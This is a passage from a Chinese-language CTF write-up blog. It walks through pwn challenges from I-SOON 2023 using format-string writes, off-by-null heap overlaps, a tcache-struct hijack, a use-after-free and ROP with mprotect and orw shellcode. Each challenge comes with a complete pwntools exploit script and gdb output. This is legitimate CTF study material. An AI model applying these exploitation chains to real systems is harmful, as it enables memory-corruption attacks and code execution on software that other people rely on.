0x556c845532a0 ◂— &#39;%24160c%15$hn&#39;                                       03:0018│ rbp 0x7ffe1c865e60 —▸ 0x7ffe1c865e70 ◂— 0x1                                                   04:0020│     0x7ffe1c865e68 —▸ 0x556c83a69543 (main+65) ◂— mov    eax, 0                               05:0028│     0x7ffe1c865e70 ◂— 0x1                                                                     06:0030│     0x7ffe1c865e78 —▸ 0x7f51add7ad90 ◂— mov    edi, eax                                       07:0038│     0x7ffe1c865e80 ◂— 0x0                                                                     </code></pre><p>可以看到这里printf准备返回了已经，此时rsp上面就写着返回的地址，并且此时这里我们并没有动到rbp，所以我们可以写rsp的值为我们的一个特殊的指令，比如说就是我们的某个指令，然后再跟下面rbp进行配合即可，因此我们选用ret2rcu上的一段指令，</p><pre><code class="hljs">pwndbg&gt; x/20i 0x5582df56d5b0                           0x5582df56d5b0 &lt;__libc_csu_init+96&gt;: pop    r14     0x5582df56d5b2 &lt;__libc_csu_init+98&gt;: pop    r15     0x5582df56d5b4 &lt;__libc_csu_init+100&gt;:        ret </code></pre><p>我们看到这里的指令真是妙到极点，我们通过ret到该指令这里，然后连续pop两个值，再调用ret就会弹出我们rbp的值，然后就可以执行我们写入rbp的one_gadget了，情况如下：</p><pre><code class="hljs">──────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────                                           0x7f02c954b81a &lt;printf+170&gt;             call   0x7f02c95600b0                &lt;0x7f02c95600b0&gt;                                                                                                                                                   0x7f02c954b81f &lt;printf+175&gt;             mov    rdx, qword ptr [rsp + 0x18]                                              0x7f02c954b824 &lt;printf+180&gt;             sub    rdx, qword ptr fs:[0x28]                                                 0x7f02c954b82d &lt;printf+189&gt;             jne    printf+199                &lt;printf+199&gt;                                                                                                                                                           0x7f02c954b82f &lt;printf+191&gt;             add    rsp, 0xd8                                                              ► 0x7f02c954b836 &lt;printf+198&gt;             ret                                  &lt;0x55711d89d5b0; __libc_csu_init+96&gt;        ↓                                                                                                                      0x55711d89d5b0 &lt;__libc_csu_init+96&gt;     pop    r14                                                                      0x55711d89d5b2 &lt;__libc_csu_init+98&gt;     pop    r15                                                                      0x55711d89d5b4 &lt;__libc_csu_init+100&gt;    ret                                                                              ↓                                                                                                                      0x7f02c95d6cf5 &lt;execvpe+1141&gt;           mov    rsi, r10                                                                 0x7f02c95d6cf8 &lt;execvpe+1144&gt;           lea    rdi, [rip + 0xec999]                                                  ───────────────────────────────────[ STACK ]────────────────────────────────────                                        00:0000│ rsp 0x7ffcfb0d93c8 —▸ 0x55711d89d5b0 (__libc_csu_init+96) ◂— pop    r14                                        01:0008│     0x7ffcfb0d93d0 ◂— 0x0                                                                                      02:0010│     0x7ffcfb0d93d8 —▸ 0x55711ed972a0 ◂— &#39;%176c%45$hhn&#39;                                                         03:0018│ rbp 0x7ffcfb0d93e0 —▸ 0x7f02c95d6cf5 (execvpe+1141) ◂— mov    rsi, r10                                         04:0020│     0x7ffcfb0d93e8 —▸ 0x55711d89d543 (main+65) ◂— mov    eax, 0                                                05:0028│     0x7ffcfb0d93f0 ◂— 0x1                                                                                      06:0030│     0x7ffcfb0d93f8 —▸ 0x7f02c9514d90 ◂— mov    edi, eax                                                        07:0038│     0x7ffcfb0d9400 ◂— 0x0                                                                                      </code></pre><p>至于任意地址写，是我们通过栈上存在的一个<code>栈地址-&gt;栈地址-&gt;栈地址</code>链条来达成，具体手法可以自行搜索<br>exp如下：</p><pre><code class="hljs">from pwn import *from LibcSearcher import *from ctypes import *context(arch = &#39;amd64&#39;, os = &#39;linux&#39;, log_level = &#39;debug&#39;)context.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]io = process(&#39;./pwn&#39;)#io = remote(&#39;node4.anna.nssctf.cn&#39;,28151)s   = lambda content : io.send(content)sl  = lambda content : io.sendline(content)sa  = lambda content,send : io.sendafter(content, send)sla = lambda content,send : io.sendlineafter(content, send)rc  = lambda number : io.recv(number)ru  = lambda content : io.recvuntil(content)def slog(name, address): print(&quot;\033[40;34m[+]\033[40;35m&quot; + name + &quot;==&gt;&quot; +hex(address) + &quot;\033[0m&quot;)def debug():    gdb.attach(io)    def get_address(): return u64(ru(&#39;\x7f&#39;)[-6:].ljust(8, b&#39;\x00&#39;))sa(&quot;game!\n&quot;, b&#39;\x00&#39;*32)sla(&quot;input: \n&quot;, str(0x6b8b4544))sla(&quot;input: \n&quot;, str(0x327b23e3))sla(&quot;input: \n&quot;, str(0x643c984e))sla(&quot;input: \n&quot;, str(0x66334858))sla(&quot;input: \n&quot;, str(0x74b0dc76))sla(&quot;input: \n&quot;, str(0x19495cdc))sla(&quot;input: \n&quot;, str(0x2ae8946f))sla(&quot;input: \n&quot;, str(0x625558c9))sla(&quot;input: \n&quot;, str(0x238e1f0e))sla(&quot;input: \n&quot;, str(0x46e87cea))sla(&quot;input: \n&quot;, str(0x3d1b589f))sla(&quot;input: \n&quot;, str(0x507ed790))sla(&quot;input: \n&quot;, str(0x2eb141d7))sla(&quot;input: \n&quot;, str(0x41b71ee0))sla(&quot;input: \n&quot;, str(0x79e2a9c8))sla(&quot;input: \n&quot;, str(0x7545e163))sla(&quot;input: \n&quot;, str(0x515f0059))sla(&quot;input: \n&quot;, str(0x5bd062e7))sla(&quot;input: \n&quot;, str(0x12200871))sla(&quot;input: \n&quot;, str(0x4db127dd))sla(&quot;input: \n&quot;, str(0x2162340))elf = ELF(&#39;./pwn&#39;)libc = ELF(&#39;./libc.so.6&#39;)sla(&quot;data ;)\n&quot;, b&#39;%11$p%9$p%8$p&#39;)ru(&#39;0x&#39;)libc_base = int(rc(12), 16) - 0x29d90ru(&#39;0x&#39;)pro_base = int(rc(12), 16) - 0x1543ru(&#39;0x&#39;)stack_addr = int(rc(12), 16) - 0x28slog(&quot;stack_addr&quot;, stack_addr)slog(&quot;libc_base&quot;, libc_base)slog(&quot;pro_base&quot;, pro_base)stack_low2 = int(stack_addr%0x10000)print(stack_low2)rbp = stack_addr + 0x18rbp_low2 = int(rbp%0x10000)#change the rbpone_gadget = [0x50a37, 0xebcf1, 0xebcf5, 0xebcf8]shell = libc_base + one_gadget[2]shell_low2 = shell%0x10000shell_mid2 = int(shell/0x10000)%0x10000shell_high2 = int(shell/0x100000000)slog(&quot;shell&quot;, shell)sla(&quot;data ;)\n&quot;, &#39;%&#39;+str(rbp_low2) + &#39;c%15$hn\x00&#39;)sla(&quot;data ;)\n&quot;, &#39;%&#39;+str(shell_low2) + &#39;c%45$hn\x00&#39;)sla(&quot;data ;)\n&quot;, &#39;%&#39;+str(rbp_low2 + 2) + &#39;c%15$hn\x00&#39;)sla(&quot;data ;)\n&quot;, &#39;%&#39;+str(shell_mid2) + &#39;c%45$hn\x00&#39;)sla(&quot;data ;)\n&quot;, &#39;%&#39;+str(rbp_low2 + 4) + &#39;c%15$hn\x00&#39;)sla(&quot;data ;)\n&quot;, &#39;%&#39;+str(shell_high2) + &#39;c%45$hn\x00&#39;)#change the retsla(&quot;data ;)\n&quot;, &#39;%&#39;+str(stack_low2) + &#39;c%15$hn\x00&#39;)debug()sla(&quot;data ;)\n&quot;, &#39;%176c%45$hhn\x00&#39;)io.interactive()</code></pre><h2 id="2-I-SOON-2023-pwnpwn"><a href="#2-I-SOON-2023-pwnpwn" class="headerlink" title="2. [I-SOON 2023]pwnpwn"></a>2. [I-SOON 2023]pwnpwn</h2><pre><code class="hljs">dawn@dawn-virtual-machine:~/Downloads/pwnpwn$ checksec pwn[*] &#39;/home/dawn/Downloads/pwnpwn/pwn&#39;    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      PIE enabled</code></pre><p>题目环境2.31,保护全开<br>本题十分的可惜，应该是可以出的，感觉是pwn1一直没想到所以心态有点问题，导致本题看的时候居然off by null没看到，这也说明了比赛中心境也是一个重要点，本题十分常规，最开始ida会有一些混淆，例如：</p><pre><code class="hljs">  sub_B20();  puts(&quot;Welcome to An Xun Cup, this is an menu&quot;);  check();  while ( 1 )  &#123;    menu();    __isoc99_scanf(&quot;%d&quot;, &amp;choice);    switch ( choice )    &#123;      case 1:        add();        break;      case 2:        if ( dword_203024 &lt; 10 || (((dword_203098 - 1) * dword_203098) &amp; 1) == 0 )          goto LABEL_5;        do        &#123;          show();LABEL_5:          show();        &#125;        while ( dword_203024 &gt;= 10 &amp;&amp; (((dword_203098 - 1) * dword_203098) &amp; 1) != 0 );        break;</code></pre><p>慢慢逆会发现这些语句就是一些重复的，不用管他们，整个题首先需要ctypes进行模拟，出几个随机数的个位来猜组合的千位数，然后这里面show和edit&#x2F;delete功能不能同时使用，需要运行权限切换的一个函数来切换状态，其他就十分常规，add函数里面由off by null（我朝，太sb了我）。</p><p>然后之后就是制造重叠堆块，向上合并，这里记住恢复一下堆块们的布局，之后就是重叠堆块中写以释放堆块tcachebins的fd指针了，很常规，写free hook，</p><p>exp如下：</p><pre><code class="hljs">from pwn import *from LibcSearcher import *from ctypes import *context(arch = &#39;amd64&#39;, os = &#39;linux&#39;, log_level = &#39;debug&#39;)context.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]io = process(&#39;./pwn&#39;)#io = remote(&#39;node4.anna.nssctf.cn&#39;,28151)s   = lambda content : io.send(content)sl  = lambda content : io.sendline(content)sa  = lambda content,send : io.sendafter(content, send)sla = lambda content,send : io.sendlineafter(content, send)rc  = lambda number : io.recv(number)ru  = lambda content : io.recvuntil(content)def slog(name, address): print(&quot;\033[40;34m[+]\033[40;35m&quot; + name + &quot;==&gt;&quot; +hex(address) + &quot;\033[0m&quot;)def debug():    gdb.attach(io)    def get_address(): return u64(ru(&#39;\x7f&#39;)[-6:].ljust(8, b&#39;\x00&#39;))def add(index, size, content):    sla(&quot;root@$\n&quot;, str(1))    sla(&quot;index:\n&quot;, str(index))    sla(&quot;size:\n&quot;, str(size))    sa(&quot;content:\n&quot;, content)def show(index):    sla(&quot;root@$\n&quot;, str(2))    sla(&quot;index:\n&quot;, str(index))def edit(index, content):    sla(&quot;root@$\n&quot;, str(3))    sla(&quot;index\n&quot;, str(index))    sla(&quot;index\n&quot;, str(index))    sa(&quot;content:\n&quot;, content)def edit_0(index, content):    sla(&quot;root@$\n&quot;, str(3))    sla(&quot;index\n&quot;, str(index))    sa(&quot;content:\n&quot;, content)def delete(index):    sla(&quot;root@$\n&quot;, str(4))    sla(&quot;index:\n&quot;, str(index))def login(passwd):    sla(&quot;root@$\n&quot;, str(5))    sla(&quot;username\n&quot;, &#39;fang&#39;)    sla(&quot;passwd\n&quot;, passwd) LIBC = cdll.LoadLibrary(&#39;./libc-2.31.so&#39;)LIBC.srand(LIBC.time(0))libc = ELF(&#39;./libc-2.31.so&#39;)qian = LIBC.rand()%10bai = LIBC.rand()%10shi = LIBC.rand()%10ge = LIBC.rand()%10num = qian*1000 + bai*100 + shi*10 + gesla(&quot;number:&quot;, str(num))add(0, 0x410,  b&#39;aaaaa&#39;)add(1, 0x20, b&#39;ccc&#39;)login(&#39;abcd&#39;)   # show-&gt;edits(&#39;\n&#39;)edit(0, b&#39;cbdfasaf&#39;)delete(0)add(0, 0x410, b&#39;a&#39;*7)edit(0, b&#39;a&#39;*8)debug()login(&#39;a&#39;*8)   # edit-&gt;showshow(0)libc_base = get_address() - 0x1ecbe0slog(&quot;libc_base&quot;, libc_base)malloc_hook = libc_base + libc.sym[&#39;__malloc_hook&#39;]slog(&quot;__malloc_hook&quot;, malloc_hook)free_hook = libc_base + libc.sym[&#39;__free_hook&#39;]slog(&quot;__free_hook&quot;, free_hook)system = libc_base + libc.sym[&#39;system&#39;]# leak the heaplogin(b&#39;a&#39;*3 + b&#39;\x00&#39;) #show-&gt;editadd(2, 0x20, b&#39;fdasf&#39;)add(3, 0x4f0, b&#39;aaaa&#39;)add(4, 0x10, b&#39;aaaa&#39;)add(5, 0x20, b&#39;aaaa&#39;)delete(0)add(6, 0x500, b&#39;cccc&#39;)add(0, 0x410, b&#39;aaaa&#39;)edit(0, b&#39;a&#39;*0xf + b&#39;c&#39;) login(b&#39;a&#39;*8) #edit-&gt;showshow(0)ru(&#39;ac&#39;)heap_base = u64(rc(6).ljust(8, b&#39;\x00&#39;)) - 0x290slog(&quot;heap_base&quot;, heap_base)login(b&#39;aaa\x00&#39;)delete(2)add(2, 0x28, p64(heap_base + 0x6c0) + b&#39;a&#39;*0x18 + p64(0x50))delete(1)add(1, 0x20, p64(0)+p64(0x51) + p64(heap_base + 0x6f0 - 0x18) + p64(heap_base + 0x6f0 - 0x10))   #pass the unlink checkdelete(3)       #overlap backwardadd(3, 0x100, p64(0)*3 + p64(0x31))    #resolve the heapdelete(5)delete(2)delete(3)add(3, 0x100, p64(0)*3 + p64(0x31) + p64(free_hook))add(2, 0x20, b&#39;ccc&#39;)add(5, 0x20, p64(system))add(7, 0x20, b&#39;/bin/sh\x00&#39;)delete(7)io.interactive()</code></pre><h2 id="3-I-SOON-2023-DE-CAT"><a href="#3-I-SOON-2023-DE-CAT" class="headerlink" title="3.[I-SOON 2023] DE-CAT"></a>3.[I-SOON 2023] DE-CAT</h2><p>照常检查，</p><pre><code class="hljs">dawn@dawn-virtual-machine:~/Downloads/pwn/toCTFer$ checksec pwn [*] &#39;/home/dawn/Downloads/pwn/toCTFer/pwn&#39;                          Arch:     amd64-64-little                                       RELRO:    Full RELRO                                            Stack:    Canary found                                          NX:       NX enabled                                            PIE:      PIE enabled                                           RUNPATH:  b&#39;./&#39;                                             </code></pre><p>保护全开以及版本为2.35</p><pre><code class="hljs">dawn@dawn-virtual-machine:~/Downloads/pwn/toCTFer$ seccomp-tools dump ./pwn  line  CODE  JT   JF      K                                                 =================================                                            0000: 0x20 0x00 0x00 0x00000004  A = arch                                   0001: 0x15 0x00 0x02 0xc000003e  if (A != ARCH_X86_64) goto 0004            0002: 0x20 0x00 0x00 0x00000000  A = sys_number                             0003: 0x15 0x00 0x01 0x0000003b  if (A != execve) goto 0005                 0004: 0x06 0x00 0x00 0x00000000  return KILL                                0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW                              </code></pre><p>存在沙盒，禁止了execve，所以基本上可以确定使用orw</p><p>题目的漏洞为edit函数当中的off by null</p><pre><code class="hljs">  result = (*(&amp;chunk_list + v1) + read(0, *(&amp;chunk_list + v1), size_list[v1]));  *result = 0;</code></pre><p>因此本题依然是采用overlapp来解题，首先是制造重叠堆块，然后修改tcache，这里因为我们需要多次分配奇奇怪怪的堆块，所以我们先控制tcache struct的0x290堆块来任意分配堆块。</p><p>控制了tcache struct后我们就可以通过environ来获取栈地址，然后我们修改add的ret地址来制造ROP，这里我们调用mprotect函数来将我们的栈地址增加一个执行权限，然后再到上面布置shellcode即可orw</p><p>exp如下：</p><pre><code class="hljs">from pwn import * from LibcSearcher import* context(arch = &#39;amd64&#39;, os = &#39;linux&#39;, log_level = &#39;debug&#39;) context.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]io = process(&#39;./pwn&#39;)#io = remote(&#39;59.110.164.72&#39;, 10066) #io = remote(&quot;node4.buuoj.cn&quot;, 26610)s   = lambda content : io.send(content)sl  = lambda content : io.sendline(content)sa  = lambda content,send : io.sendafter(content, send)sla = lambda content,send : io.sendlineafter(content, send)rc  = lambda number : io.recv(number)ru  = lambda content : io.recvuntil(content)def slog(name, address): print(&quot;\033[40;31m[+]\033[40;35m&quot;+ name + &quot;==&gt;&quot; + hex(address) + &quot;\033[0m&quot;)def debug(): gdb.attach(io)def get_address(): return u64(ru(b&#39;\x7f&#39;)[-6:].ljust(8, b&#39;\x00&#39;))def add(size, content):    #0x2d    sla(b&quot;&gt;&gt; \n&quot;, &#39;1&#39;)    sla(b&quot;size:\n&quot;,str(size))    sa(b&#39;content:\n&#39;, content)def delete(index):    sla(b&#39;&gt;&gt; \n&#39;, &#39;2&#39;)    sla(&quot;idx:\n&quot;, str(index))def show(index):    sla(b&quot;&gt;&gt; \n&quot;, &#39;3&#39;)    sla(b&#39;idx:\n&#39;, str(index))def edit(index, content):    sla(b&quot;&gt;&gt; \n&quot;, &#39;4&#39;)    sla(b&#39;idx:\n&#39;, str(index))    sa(b&#39;content:\n&#39;, content)def kill(index):    sla(b&quot;&gt;&gt; \n&quot;, &#39;5&#39;)    sla(b&#39;---&gt;\n&#39;, str(index))add(0x4f8, b&#39;aaaa&#39;) #0add(0x4f8, b&#39;aaaa&#39;)  #1delete(0)add(0x5f8, b&#39;aaaa&#39;) #0add(0x4f8, b&#39; &#39;) #2show(2)ru(&#39;\x00\x00&#39;)libc_base = get_address()- 0x21a110ru(&#39;\x00\x00&#39;)heap_base = u64(rc(6).ljust(8, b&#39;\x00&#39;)) - 0x290slog(&quot;libc_base&quot;, libc_base)slog(&quot;heap_base&quot;, heap_base)edit(2, flat(&#123;0x0:heap_base + 0x290, 0x8:heap_base + 0x290, 0x4f0:0x500&#125;, filler = b&#39;\x00&#39;, length = 0x4f8))libc = ELF(&#39;./libc.so.6&#39;)mprotect = libc_base + libc.sym[&#39;mprotect&#39;]slog(&quot;mprotect&quot;, mprotect)delete(1) #overlap backwardadd(0x288, b&#39;aa&#39;) #1add(0x288, b&#39;a&#39;) #3delete(3)delete(2)edit(1, p64(((heap_base + 0x2a0)&gt;&gt;12)^(heap_base + 0x10))) #alloc the tcache structadd(0x288, b&#39;aa&#39;) #2add(0x288, flat(&#123;0x30:0x1, 0x140:libc_base + 0x221200 - 0x10&#125;, filler = b&#39;\x00&#39;, length = 0x288)) #3 , environadd(0x198, b&#39;a&#39;*0x10) #4show(4)stack_addr = get_address()slog(&quot;stack&quot;, stack_addr)debug()add_ret = stack_addr - 0x140pop_rdi = libc_base + 0x000000000002a3e5pop_rsi = libc_base + 0x000000000002be51pop_rdx_r12 = libc_base + 0x000000000011f497jmp_rsp = libc_base + 0x8821dedit(3, flat(&#123;0x30:0x1, 0x140:add_ret - 0x8&#125;, filler = b&#39;\x00&#39;))slog(&quot;add_ret&quot;, add_ret)payload = p64(0) + p64(pop_rdi) + p64(stack_addr&amp;(~0xfff)) + p64(pop_rsi) + p64(0x1000) + p64(pop_rdx_r12) + p64(7)*2 + p64(mprotect)payload += p64(jmp_rsp)shellcode = shellcraft.open(&#39;./flag&#39;, 0)shellcode += shellcraft.read(&#39;rax&#39;, heap_base + 0xca0, 0x30)shellcode += shellcraft.write(1, heap_base + 0xca0, 0x30)shellcode = asm(shellcode)payload += shellcode + b&#39;aaaa&#39;add(0x198, payload)io.interactive()</code></pre><h2 id="4-I-SOON-2023-computer"><a href="#4-I-SOON-2023-computer" class="headerlink" title="4.[I-SOON 2023]computer"></a>4.[I-SOON 2023]computer</h2><p>本题突一个字“逆”，题目中冗杂的数据结构以及分配手法令人眼花缭乱。此时仅需要一颗平静的心态和良好的环境（以及星盟的wp呜呜呜）。</p><p>据说computer团长一个半小时就出了，tql。</p><p>先检查一下，不过多半也是全开</p><pre><code class="hljs">dawn@dawn-virtual-machine:~/Downloads/pwn/computer$ checksec computer        [*] &#39;/home/dawn/Downloads/pwn/computer/computer&#39;                                 Arch:     amd64-64-little                                                    RELRO:    Full RELRO                                                         Stack:    Canary found                                                       NX:       NX enabled                                                         PIE:      PIE enabled                                                        RUNPATH:  b&#39;../../../tools/glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/&#39; </code></pre><p>其中也存在沙盒，因此是采用orw</p><pre><code class="hljs">dawn@dawn-virtual-machine:~/Downloads/pwn/computer$ seccomp-tools dump ./computer     line  CODE  JT   JF      K                                                          =================================                                                     0000: 0x20 0x00 0x00 0x00000004  A = arch                                            0001: 0x15 0x00 0x02 0xc000003e  if (A != ARCH_X86_64) goto 0004                     0002: 0x20 0x00 0x00 0x00000000  A = sys_number                                      0003: 0x15 0x00 0x01 0x0000003b  if (A != execve) goto 0005                          0004: 0x06 0x00 0x00 0x00030000  return TRAP                                         0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW                                       </code></pre><p>然后就是本题最为关键的逆向环节</p><pre><code class="hljs">void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)&#123;  char s[2568]; // [rsp+10h] [rbp-A10h] BYREF  unsigned __int64 v4; // [rsp+A18h] [rbp-8h]  v4 = __readfsqword(0x28u);  sub_3E2C();  root_dir = create(&quot;/&quot;, 1, 0LL, 7);            // 创建文件夹  root_ptr = root_dir;  HRP = create(&quot;HRP&quot;, 0, 0LL, 7);               // 创建文件  linkfile(root_dir, HRP);                      // /HRP  mkflag(root_dir);  while ( 1 )  &#123;    printf(&quot;&gt; &quot;);    fgets(s, 2560, stdin);    s[strcspn(s, &quot;\n&quot;)] = 0;    menu(&amp;root_ptr, s, root_dir, HRP);    fflush(stdin);  &#125;&#125;</code></pre><p>其中create函数可以得知他可以根据所给参数判断是创建文件或文件夹，文件的部分大致如下：</p><pre><code class="hljs">|文件名指针|         ||文件内容指针|上级文档| |文件类型  |下一个文件 ||文件大小  |          |</code></pre><p>这里最难绷的是ida本身可能会出现点反编译的错误，所以我们需要在给数据结构赋值过程中查看汇编语言来帮助我们逆向，在其中会出现malloc的情况，除此之外我们还需要注意到strdup这个函数。</p><p>strdup这个函数是一个复制函数，他会在内部malloc一定空间，然后复制参数到其中，最后将该空间作为返回值传递，因此他也经常与free函数一起出现，但是这里我们发现并没有。</p><p>然后函数就是让我们不断传递控制命令，其中有漏洞的地方就是kill命令有一个uaf，如下：</p><pre><code class="hljs">  else if ( !strcmp(command_0, &quot;kill&quot;) )  &#123;    v12 = atoi(command_1);    if ( v12 &gt;= 0 &amp;&amp; v12 &lt;= exec_num )    &#123;      free(*(*(&amp;process + v12) + 8LL));      free(*(&amp;process + v12));      --exec_num;      printf(&quot;%d had been killed\n&quot;, v12);    &#125;  &#125;</code></pre><p>这里我们采用的方式是先填充tcache，通过unsortbin来泄露libc和heap基地址，然后在fastbin中构造A-B-A来进攻击，最后修改我们menu函数的返回值来写ROP</p><p>exp如下：</p><pre><code class="hljs">from pwn import *from LibcSearcher import *from ctypes import *context(arch = &#39;amd64&#39;, os = &#39;linux&#39;, log_level = &#39;debug&#39;)context.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]io = process(&#39;./computer&#39;)#io = remote(&#39;node4.anna.nssctf.cn&#39;,28151)s   = lambda content : io.send(content)sl  = lambda content : io.sendline(content)sa  = lambda content,send : io.sendafter(content, send)sla = lambda content,send : io.sendlineafter(content, send)rc  = lambda number : io.recv(number)ru  = lambda content : io.recvuntil(content)def slog(name, address): print(&quot;\033[40;34m[+]\033[40;35m&quot; + name + &quot;==&gt;&quot; +hex(address) + &quot;\033[0m&quot;)def debug():    gdb.attach(io)    def get_address(): return u64(ru(&#39;\x7f&#39;)[-6:].ljust(8, b&#39;\x00&#39;))sla(&quot;&gt; &quot;, b&#39;touch &#39; + b&#39;a&#39;*0xe7)for i in range(16):    sla(&quot;&gt; &quot;, b&#39;exec &#39; + b&#39;a&#39;*0xe7)for i in range(10):    sla(&quot;&gt; &quot;, b&#39;touch &#39; + str(i).encode())for i in range(8)[::-1]:    sla(&quot;&gt; &quot;, b&quot;kill &quot; + str(i).encode())# now we have tcache(0x20):7, tcache(0xf0):7, fastbin(0x20):1, unsortbin(0xf0):1sla(&quot;&gt; &quot;, b&quot;ps&quot;)libc_base = get_address() - 0x3ebca0slog(&quot;libc_base&quot;, libc_base)libc = ELF(&#39;./libc-2.27.so&#39;)sla(&quot;&gt; &quot;, b&#39;touch &#39; + b&#39;b&#39;*8 + p64(libc_base + libc.sym[&#39;_environ&#39;]))sla(&quot;&gt; &quot;, b&#39;ps&#39;)ru(&#39;\x09&#39;)ru(&#39;\x09&#39;)heap_base = u64(rc(6).ljust(8, b&#39;\x00&#39;)) - 0x660slog(&quot;heap_base&quot;, heap_base)ru(&#39;\x09&#39;)stack_addr = u64(rc(6).ljust(8, b&#39;\x00&#39;))slog(&quot;stack_addr&quot;, stack_addr)sla(&quot;&gt; &quot;, b&#39;rm 0&#39;)  #fix the tcachesla(&quot;&gt; &quot;, b&#39;rm 1&#39;)sla(&quot;&gt; &quot;, b&#39;kill 0&#39;)sla(&quot;&gt; &quot;, b&#39;mkdir new&#39;)sla(&quot;&gt; &quot;, b&#39;cd new&#39;)sla(&quot;&gt; &quot;, b&#39;touch 00&#39;)sla(&quot;&gt; &quot;, b&#39;touch 01&#39;)sla(&quot;&gt; &quot;, b&#39;touch 02&#39;)sla(&quot;&gt; &quot;, b&#39;touch &#39; + p64(stack_addr - 0xb28))sla(&quot;&gt; &quot;, b&#39;touch &#39; + b&#39;03&#39;*0x19)slog(&quot;stack_ret&quot;, stack_addr - 0xb28)pop_rdi = libc_base + 0x2164fpop_rsi = libc_base + 0x23a6apop_rdx = libc_base + 0x1b96pop_rax = libc_base + 0x1b500jmp_rsp = libc_base + 0x2b25mprotect = libc_base + libc.sym[&#39;mprotect&#39;]flag_addr = heap_base + 0x1b90add_rsp_sub = libc_base + 0xbaf9cpl = b&#39;a&#39;*8 + p64(add_rsp_sub) + b&#39;a&#39;*(0x100-0x26) + p64(pop_rdi) + p64((stack_addr - 0xb28)&amp;(~0xfff)) + p64(pop_rsi) + p64(0x1000) + p64(pop_rdx) +p64(7) + p64(mprotect)pl += p64(jmp_rsp)shellcode = asm(shellcraft.open(&quot;./flag&quot;, 0) + shellcraft.read(&#39;3&#39;, heap_base + 0x1440, 0x30) + shellcraft.write(1, heap_base + 0x1440, 0x30))pl += shellcodesla(&quot;&gt; &quot;, b&#39;touch &#39; + pl)io.interactive()</code></pre>]]></content>
    
    
    <categories>
      
      <category>CTFwp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PWN</tag>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
